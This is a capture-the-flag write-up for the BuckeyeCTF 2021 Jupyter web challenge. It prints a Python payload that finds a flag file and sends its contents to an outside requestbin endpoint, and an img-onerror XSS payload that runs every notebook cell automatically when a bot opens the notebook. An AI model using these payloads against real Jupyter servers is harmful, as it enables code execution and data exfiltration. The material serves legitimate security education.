# BuckeyeCTF 2021 - `web/jupyter`

## Task Description

Upload a Jupyter notebook and the admin bot will take a look at it :)

URL: http://3.21.105.111

Note: Try to be gentle with the server

## Solution Summary

Use HTML cell to place XSS on the Jupyter notebook which forces the bot to run a code cell with Python code that exfiltrates the flag.

## Task Analysis

This challenge contains two components: the `app` and the `bot`. The `app` is a web app that serves a simple file upload for [Jupyter notebooks](https://jupyter.org/),
which are documents that contain Python code cells and display their output.

![alt text](https://github.com/Nolan1324/CTF-Writeups/blob/main/buckeye-2021/jupyter/upload.png)

This will post it to the `/upload_ipynb` endpoint on the app. The file will be given a random name ending in `.ipynb` and written to an uploads folder.
The notebook will then be ran with `jupyter trust` and served at the URL `"{APP_URL}:8888/notebooks/{filename}"`.
The app will then post to the bot's `/visit` endpoint with the URL of the notebook it is hosting in the body.
Note that only the app server can send requests to this endpoint as it has to send a secret `BOT_TOKEN` along with it.

When the bot receives a valid URL on this endpoint, it will visit it using Puppeteer.
After a timeout, it will then call `window.IPython.notebook.close_and_halt()` to gracefully stop and close the Jupyter notebook that it is viewing.

The app also a contains `run.sh` which immediately moves the file containing the flag to `/flag_{rand}.txt`, where `rand` is a random hex string.
Our goal therefore is to read this file.

## Solution Walkthrough

Since Jupyter notebooks contain code cells that execute Python code on the local machine, we should be able to get the flag if the bot runs a code cell while viewing the Jupyter notebook.
Even though the bot is viewing the notebook, executed code cells will run on the app, since the app is the server hosting the Jupyter notebook.
This is good because the app has the flag file, not the bot.

I created a new notebook by downloading Jupyter and running `jupyter notebook` to open my own web enviornment.
I then wrote a simple Python payload in a code cell that exfiltrates the flag.

```python
import urllib
import glob

endpoint = 'https://enbnoedu5p8tj.x.pipedream.net/'

path = "/flag*.txt"
flag = ''

for filename in glob.glob(path):
    with open(filename, 'r') as f:
        flag = f.readline()

urllib.request.urlopen(endpoint + flag)
```

The purpose of `glob` is to find the flag's filename, since part of the filename is random.
The content of this file is then read and sent to a server created with [request.bin](https://requestbin.com/).

This code cell works when the user decides to run it.
However, there is still a problem: when the bot reads the Jupyter notebook, it doesn't actually run any of the code cells.

I noticed in the bot that `window.IPython.notebook.close_and_halt()` gets called in order to stop the notebook.
This implies that Jupyter has some Javascript functions that we could possibly leverage to get the bot to run the code cell.
After some digging, I found that running the Javascript `IPython.notebook.execute_all_cells()` on the page will run all code cells.
I tried to write a script that would execute only one cell, but I had issues with this working consistently.

Now all we need is some XSS on our Jupyter notebook page to run this Javascript.
I found that in Jupyter you can have a code cell output HTML by using the following syntax in a code cell.

```html
%%html
<!--
HTML goes here
-->
```

The HTML outputed when this code cell is ran will actually persist even if the notebook is closed and reopened (as long as you save it beforehand).
This generated HTML could be the perfect place to get some XSS running.

When I tried running my XSS using `script` tags, I sometimes had issues with the page not running the script or running it at the wrong time.
There are probably many different ways of solving this (I think you can even edit the notebook's source code directly),
but I decided to just use the quick solution of having an invalid `img` element that runs my XSS payload via `onerror`.

```html
%%html
<img src='http://example.com' onerror='if(!window.loaded) IPython.notebook.execute_all_cells(); window.loaded = true' />
```

The purpose of creating the `window.loaded` variable is just so that the script doesn't keep running itself.
Since I am executing **all** cells, the HTML will be regenerated and the event will fire again.

This had the desired effect of running all of the cells whenever I opened the notebook!
Thus all that was left was to upload this to the app server and have the bot open it for me and send me the flag.

## Solution Source

https://github.com/Nolan1324/CTF-Writeups/blob/main/buckeye-2021/jupyter/notebook.ipynb

